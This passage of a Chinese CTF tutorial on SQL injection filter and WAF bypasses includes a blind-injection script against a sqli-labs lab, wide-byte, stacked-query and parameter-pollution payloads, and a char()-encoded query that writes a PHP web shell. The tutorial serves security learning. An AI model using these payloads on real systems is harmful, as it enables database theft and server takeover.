&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>以上脚本都要注意是掌握编写思路，不是干抄脚本。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前置知识</p><p><strong>magic_quotes_gpc （魔术引号开关</strong><br>magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p><p>单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线，我们输入的东西如果不能闭合，那我们的输入就不会当作代码执行，就无法产生SQL注入。</p><p><strong>addslashes()函数</strong></p><p>返回在预定义字符之前添加反斜杠的字符串</p><p>预定义字符：单引号（’），双引号（”），反斜杠（\），NULL</p><p>宽字节概念：</p><ol><li>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)</li><li>多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</li><li>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</li><li>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</li><li>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字</li></ol><p>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</p><p>例如说MySql的编码设置为了SET NAMES ‘gbk’或是 SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p><p>宽字节SQL注入的根本原因:</p><p>宽字节SQL注入就是PHP发送请求到MySql时使用了语句</p><p>SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</p><p>magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符’’,来做一定的过滤</p><p>为了绕过magic_quotes_gpc的,于是乎我们开始导入宽字节的概念</p><p>我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1\&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，然后成功绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1�\&#x27;#&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>虽然是写在了过滤引号的位置但是其实不止适用于过滤引号<br>使用反斜杠 \ 逃逸 Sql 语句<br>如果没有过滤反斜杠的话，我们可以使用反斜杠将后面的引号转义，从而逃逸后面的 Sql 语句。</p><p>假设sql语句为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username, password from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure><p>假设输入的用户名是 admin\，密码输入的是 or 1# 整个SQL语句变成了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,password from users where username=&#x27;admin\&#x27; and password=&#x27; or 1#&#x27;</span><br></pre></td></tr></table></figure><p>由于单引号被转义，and password&#x3D;这部分都成了username的一部分，即</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&#x27;admin\&#x27; and password=&#x27;</span><br></pre></td></tr></table></figure><p>这样 or 1 就逃逸出来了，由此可控，可作为注入点了。</p><h3 id="堆叠注入时利用-MySql-预处理"><a href="#堆叠注入时利用-MySql-预处理" class="headerlink" title="堆叠注入时利用 MySql 预处理"></a>堆叠注入时利用 MySql 预处理</h3><p>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。</p><ol><li>PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(hello)供之后调用</li><li>EXECUTE：执行命令</li><li>DEALLOCATE PREPARE：释放命令</li><li>SET：用于设置变量(@a)</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure><p>这里还用大小写简单绕了一下其他过滤</p><p><strong>MySql 预处理配合十六进制绕过关键字</strong><br>基本原理如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select hex(&#x27;show databases&#x27;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| hex(&#x27;show databases;&#x27;)       |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 73686F7720646174616261736573 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set @b=0x73686F7720646174616261736573;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; prepare test from @b;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; execute test;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure><p>即payload类似如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure><p><strong>MySql预处理配合字符串拼接绕过关键字</strong><br>原理就是借助char()函数将ascii码转化为字符然后再使用concat()函数将字符连接起来，有了前面的基础这里应该很好理解了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><p>也可以不用concat函数，直接用char函数也具有连接功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p>当逗号被过滤了之后，我们便不能向下面这样正常的时候substr()函数和limit语句了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br><span class="line">select * from users limit 0,1;</span><br></pre></td></tr></table></figure><p><strong>使用from…for…绕过</strong><br>我们可以使用 from…for.. 语句替换 substr() 函数里的 ,1,1：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select database()) from 1 for 1);</span><br><span class="line"># 此时 from 1 for 1 中的两个1分别代替 substr() 函数里的两个1</span><br><span class="line"></span><br><span class="line">select substr((select database()) from 1 for 1);    # s</span><br><span class="line">select substr((select database()) from 2 for 1);    # e</span><br><span class="line">select substr((select database()) from 3 for 1);    # c</span><br><span class="line">select substr((select database()) from 4 for 1);    # u</span><br><span class="line">select substr((select database()) from 5 for 1);    # r</span><br><span class="line">select substr((select database()) from 6 for 1);    # i</span><br><span class="line">select substr((select database()) from 7 for 1);    # t</span><br><span class="line">select substr((select database()) from 8 for 1);    # y</span><br><span class="line"></span><br><span class="line"># 如果过滤了空格, 则可以使用括号来代替空格:</span><br><span class="line">select substr((select database())from(1)for(1));    # s</span><br><span class="line">select substr((select database())from(2)for(1));    # e</span><br><span class="line">select substr((select database())from(3)for(1));    # c</span><br><span class="line">select substr((select database())from(4)for(1));    # u</span><br><span class="line">select substr((select database())from(5)for(1));    # r</span><br><span class="line">select substr((select database())from(6)for(1));    # i</span><br><span class="line">select substr((select database())from(7)for(1));    # t</span><br><span class="line">select substr((select database())from(8)for(1));    # y</span><br></pre></td></tr></table></figure><p>即，from用来指定从何处开始截取，for用来指定截取的长度，如果不加for的话则 from 1 就相当于从字符串的第一位一直截取到最后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select database()) from 1);    # security</span><br><span class="line">select substr((select database()) from 2);    # ecurity</span><br><span class="line">select substr((select database()) from 3);    # curity</span><br><span class="line">select substr((select database()) from 4);    # urity</span><br><span class="line">select substr((select database()) from 5);    # rity</span><br><span class="line">select substr((select database()) from 6);    # ity</span><br><span class="line">select substr((select database()) from 7);    # ty</span><br><span class="line">select substr((select database()) from 8);    # y</span><br><span class="line"></span><br><span class="line"># 也可以使用负数来倒着截取:</span><br><span class="line">select substr((select database())from(-1));    # y</span><br><span class="line">select substr((select database())from(-2));    # ty</span><br><span class="line">select substr((select database())from(-3));    # ity</span><br><span class="line">select substr((select database())from(-4));    # rity</span><br><span class="line">select substr((select database())from(-5));    # urity</span><br><span class="line">select substr((select database())from(-6));    # curity</span><br><span class="line">select substr((select database())from(-7));    # ecurity</span><br><span class="line">select substr((select database())from(-8));    # security</span><br></pre></td></tr></table></figure><p><strong>使用offset关键字绕过</strong><br>我们可以使用 offset 语句替换 limit 语句里的逗号：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 1 offset 2;</span><br><span class="line"># 此时 limit 1 offset 2 可以代替 limit 1,2</span><br></pre></td></tr></table></figure><p><strong>利用join与别名绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select host,user from user where user=&#x27;a&#x27;union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`=&#x27;mysql&#x27;)`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`=&#x27;mysql&#x27;)b));</span><br></pre></td></tr></table></figure><p><strong>过滤information_schema绕过与无列名注入</strong></p><p>当过滤or时，这个库就会被过滤，那么mysql在被waf禁掉了information_schema库后还能有哪些利用思路呢？</p><p>information_schema 简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。</p><p>能够代替information_schema的有：<br>sys.schema_auto_increment_columns 只显示有自增的表<br>sys.schema_table_statistics_with_buffer<br>x$schema_table_statistics_with_buffer</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();</span><br></pre></td></tr></table></figure><p>mysql.innodb_table_stats<br>mysql.innodb_table_index</p><p>以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。</p><p>但是在使用上面的后两个表来获取表名之后select group_concat(table_name) from mysql.innodb_table_stats，我们是没有办法获得列的，这个时候就要采用无列名注入的办法。</p><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>123法<br>我们可以利用一些查询上的技巧来进行无列名、表名的注入。</p><p>在我们直接select 1,2,3时，会创建一个虚拟的表<br><a href="https://raw.githubusercontent.com/chencicici/images/main/202206241559936.png"><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241559936.png" alt="img"></a></p><p>如图所见列名会被定义为1，2，3</p><p>当我们结合了union联合查询之后</p><p><a href="https://raw.githubusercontent.com/chencicici/images/main/202206241559064.png"><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241559064.png" alt="img"></a></p><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password，进而我们就可以构造这样的查询语句来查询password：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/chencicici/images/main/202206241600996.png"><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241600996.png" alt="img"></a><br>末尾的 a 可以是任意字符，用于命名</p><p>当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>join<br>我们可以利用爆错，借助join和using爆出列名，id为第一列，username为第二列，可以逐个爆出，爆出全部列名之后即可得到列内数据。<br><a href="https://raw.githubusercontent.com/chencicici/images/main/202206241600089.png"><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241600089.png" alt="img"></a></p><h3 id="过滤其他关键字绕过"><a href="#过滤其他关键字绕过" class="headerlink" title="过滤其他关键字绕过"></a>过滤其他关键字绕过</h3><p>过滤 if 语句绕过<br>如果过滤了 if 关键字的话，我们可以使用case when语句绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,1,0) &lt;=&gt; case when condition then 1 else 0 end</span><br></pre></td></tr></table></figure><p>下面的if语句和case when语句是等效的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line"></span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure><h3 id="过滤-substr-绕过"><a href="#过滤-substr-绕过" class="headerlink" title="过滤 substr 绕过"></a>过滤 substr 绕过</h3><ul><li><p>使用 lpad&#x2F;lpad<br>使用lpad()和rpad()绕过substr()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select lpad((select database()),1,1)    // s</span><br><span class="line">select lpad((select database()),2,1)    // se</span><br><span class="line">select lpad((select database()),3,1)    // sec</span><br><span class="line">select lpad((select database()),4,1)    // secu</span><br><span class="line">select lpad((select database()),5,1)    // secur</span><br><span class="line">select lpad((select database()),6,1)    // securi</span><br><span class="line">select lpad((select database()),7,1)    // securit</span><br><span class="line">select lpad((select database()),8,1)    // security</span><br><span class="line"></span><br><span class="line">select rpad((select database()),1,1)    // s</span><br><span class="line">select rpad((select database()),2,1)    // se</span><br><span class="line">select rpad((select database()),3,1)    // sec</span><br><span class="line">select rpad((select database()),4,1)    // secu</span><br><span class="line">select rpad((select database()),5,1)    // secur</span><br><span class="line">select rpad((select database()),6,1)    // securi</span><br><span class="line">select rpad((select database()),7,1)    // securit</span><br><span class="line">select rpad((select database()),8,1)    // security</span><br></pre></td></tr></table></figure><p>lpad：函数语法：lpad(str1,length,str2)。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。<br>rpad：同理</p></li><li><p>使用left()绕过substr()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select left((select database()),1)    // s</span><br><span class="line">select left((select database()),2)    // se</span><br><span class="line">select left((select database()),3)    // sec</span><br><span class="line">select left((select database()),4)    // secu</span><br><span class="line">select left((select database()),5)    // secur</span><br><span class="line">select left((select database()),6)    // securi</span><br><span class="line">select left((select database()),7)    // securit</span><br><span class="line">select left((select database()),8)    // security</span><br></pre></td></tr></table></figure></li><li><p>使用mid()绕过substr()</p></li></ul><p>mid()函数的使用就和substr()函数一样了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select mid((select database()),1,1)    // s</span><br><span class="line">select mid((select database()),2,1)    // e</span><br><span class="line">select mid((select database()),3,1)    // c</span><br><span class="line">select mid((select database()),4,1)    // u</span><br><span class="line">select mid((select database()),5,1)    // r</span><br><span class="line">......</span><br></pre></td></tr></table></figure><ul><li><p>还可以使用下面这个神奇的东西绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s</span><br><span class="line">select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e</span><br><span class="line">select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c</span><br><span class="line">select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u</span><br><span class="line">select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r</span><br><span class="line">select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i</span><br><span class="line">select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>INSERT( string , position , number , string2 )</p></li></ul><p>INSERT()函数在指定位置的字符串中插入一个字符串，并插入一定数量的字符。</p><h3 id="HTTP参数污染-HPP-漏洞绕过-Waf"><a href="#HTTP参数污染-HPP-漏洞绕过-Waf" class="headerlink" title="HTTP参数污染(HPP)漏洞绕过 Waf"></a>HTTP参数污染(HPP)漏洞绕过 Waf</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。浏览器在跟服务器进行交互的过程中，浏览器往往会在GET或POST请求里面带上参数，这些参数会以 键-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。</p><p>但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com/?name=aa&name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF">http://www.baidu.com?name=aa&name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是</a> name&#x3D;aa。有的服务器是取第二个参数，也就是 name&#x3D;bb。有的服务器两个参数都取，也就是 name&#x3D;aa,bb。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p><p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同类型的Web服务器对于出现多个参数时的选择：</p><table><thead><tr><th>表头Web 服务器</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP&#x2F;Apache</td><td>$_GET[‘a’]</td><td>Last</td></tr><tr><td>JSP&#x2F;Tomcat</td><td>Request.getParameter(‘a’)</td><td>First</td></tr><tr><td>Perl(CGI)&#x2F;Apache</td><td>Param(‘a’)</td><td>First</td></tr><tr><td>Python&#x2F;Apache</td><td>getvalue(‘a’)</td><td>All</td></tr><tr><td>ASP&#x2F;IIS</td><td>Request.QueryString(‘a’)</td><td>All</td></tr></tbody></table><p>假设服务器端有两个部分：第一部分是Tomcat为引擎的JSP&#x2F;Tomcat型服务器，第二部分是Apache为引擎的PHP&#x2F;Apache型服务器。第一部分的JSP&#x2F;Tomcat服务器处做数据过滤和处理，功能类似为一个WAF，而真正提供Web服务的是PHP&#x2F;Apache服务器。那么服务端的工作流程为：客户端访问服务器，能直接访问到JSP&#x2F;Tomcat服务器，然后JSP&#x2F;Tomcat服务器再向PHP&#x2F;Apache服务器请求数据。数据返回路径则相反。</p><p>那么此时我们便可以利用不同服务器解析参数的位置不同绕过WAF的检测。来看看如下请求：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.jsp?id=1&amp;id=2</span><br></pre></td></tr></table></figure><p>客户端请求首先过JSP&#x2F;Tomcat服务器，JSP&#x2F;Tomcat服务器解析第一个参数，接下来JSP&#x2F;Tomcat服务器去请求PHP&#x2F;Apache服务器，PHP&#x2F;Apache服务器解析最后一个参数。假设JSP&#x2F;Tomcat服务器作为Waf对第一个参数进行检测，那我们便可以在第二个参数中传payload来绕过Waf。如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.jsp?id=1&amp;id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure><p>这样 Waf 可能只检测第一个参数 id&#x3D;1，而PHP脚本真正识别的是 id&#x3D;select database()–+<br>[例题]Sql-Labs Less-29</p><h3 id="False-注入绕过"><a href="#False-注入绕过" class="headerlink" title="False 注入绕过"></a>False 注入绕过</h3><p><strong>False 注入原理</strong><br>前面我们学过的注入都是基于1&#x3D;1这样比较的普通注入，下面来说一说 False 注入，利用 False 我们可以绕过一些特定的 WAF 以及一些未来不确定的因素。</p><p>首先我们来看一看下面这个sql查询语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where uesrname = 0;</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/chencicici/images/main/202206241610227.png"><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241610227.png" alt="img"></a></p><p>为什么 username &#x3D; 0 会导致返回数据，而且是全部数据呢？</p><p>这就是一个基于 False 注入的例子，下面再举一个例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = 0;</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/chencicici/images/main/202206241611666.png"><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241611666.png" alt="img"></a></p><p>和上面是同一个表，但是为什么这里只返回了两组数据呢？说到这里不得不说一说有关于 MYSQL 的隐式类型转换。</p><p>MYSQL 的隐式类型转换，即当字符串和数字比较时，会把字符串转为浮点数，而字符串转换为浮点数很明显会转换失败，这时就会产生一个warning，转换的结果为0，然后0 &#x3D; 0 返回的是 True ，这样就将表中的数据全部返回了。但如果字符串开头是数字话还是会从数字部分截断，转换为数字进行比较，在第二个例子中，passwd 字段中有一个值是以数字1开头的并非为0，再进行 passwd &#x3D; 0 比较时，会从1开始截断，1 &#x3D; 0 不成立，当然就只返回两条数据了。这就是 MYSQL False 注入的原理。</p><p><strong>False 注入利用</strong><br>下面我们讲讲 False 注入如何利用，及如何构造 False 注入的利用点。在实际中我们接触到的语句都是带有引号的，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username =&#x27;.$username.&#x27;;</span><br></pre></td></tr></table></figure><p>在这种情况下，我们如何绕过引号构造出 0 这个值呢，我们需要做一些处理来构造false注入的利用点？</p><p>可以使用的姿势有很多，比如下面的算数运算：</p><ul><li><p>利用算数运算</p><p>加：+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;+&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;+&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>减：-</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;-&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;-&#x27;&#x27;;</span><br></pre></td></tr></table></figure></li></ul><p>乘：*</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;*&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;*&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>除：&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;/6#, 拼接的语句: select * from user where username =&#x27;&#x27;/6#&#x27;;</span><br></pre></td></tr></table></figure><p>取余：%</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;%1#, 拼接的语句: select * from user where username =&#x27;&#x27;%1#&#x27;;</span><br></pre></td></tr></table></figure><ul><li><p>利用位操作运算</p><p>我们还可以使用当字符串和数字运算的时候类型转换的问题进行利用。</p><p>和运算：&amp;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;&amp;0#, 拼接的语句: select * from user where username =&#x27;&#x27;&amp;0#&#x27;;</span><br></pre></td></tr></table></figure></li></ul><p>或运算：|</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;|0#, 拼接的语句: select * from user where username =&#x27;&#x27;|0#&#x27;;</span><br></pre></td></tr></table></figure><p>异或运算：^</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;^0#, 拼接的语句: select * from user where username =&#x27;&#x27;^0#&#x27;;</span><br></pre></td></tr></table></figure><p>移位操作：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;&lt;&lt;0# 或 &#x27;&gt;&gt;0#, 拼接的语句: </span><br><span class="line">select * from user where username =&#x27;&#x27;&lt;&lt;0#&#x27;;</span><br><span class="line">select * from user where username =&#x27;&#x27;&gt;&gt;0#&#x27;;  </span><br></pre></td></tr></table></figure><ul><li><p>利用比较运算符</p><p>安全等于：&lt;&#x3D;&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;=0&lt;=&gt;1# 拼接的语句：where username=&#x27;&#x27;=0&lt;=&gt;1#&#x27;</span><br></pre></td></tr></table></figure></li></ul><p>不等于&lt;&gt;(!&#x3D;)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;=0&lt;&gt;0# 拼接的语句：where username=&#x27;&#x27;=0&lt;&gt;0#&#x27;</span><br></pre></td></tr></table></figure><p>大小于&gt;或&lt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;-1# 拼接的语句：where username=&#x27;&#x27;&gt;-1#</span><br></pre></td></tr></table></figure><ul><li><p>其他</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+1 is not null#  &#x27;in(-1,1)#  &#x27;not in(1,0)#  &#x27;like 1#  &#x27;REGEXP 1#  &#x27;BETWEEN 1 AND 1#  &#x27;div 1#  &#x27;xor 1#  &#x27;=round(0,1)=&#x27;1  &#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>综合利用<br>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</p></li></ul><p>这里举例一道题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include(&quot;config.php&quot;);  </span><br><span class="line">$conn -&gt;query(&quot;set names utf8&quot;);  </span><br><span class="line"></span><br><span class="line">function randStr($lenth=32)&#123;</span><br><span class="line">     $strBase = &quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;;</span><br><span class="line">     $str = &quot;&quot;;</span><br><span class="line">     while($lenth&gt;0)&#123;</span><br><span class="line">       $str.=substr($strBase,rand(0,strlen($strBase)-1),1);</span><br><span class="line">       $lenth --;</span><br><span class="line">     &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line">if($install)&#123;</span><br><span class="line">     $sql = &quot;create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;;</span><br><span class="line">     if($conn-&gt;query($sql))&#123;</span><br><span class="line">        $sql  = &quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;.md5(randStr()).&quot;&#x27;,&#x27;admin&#x27;)&quot;;</span><br><span class="line">        $conn -&gt; query($sql);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line">function filter($str)&#123;</span><br><span class="line">      $filter = &quot;/ 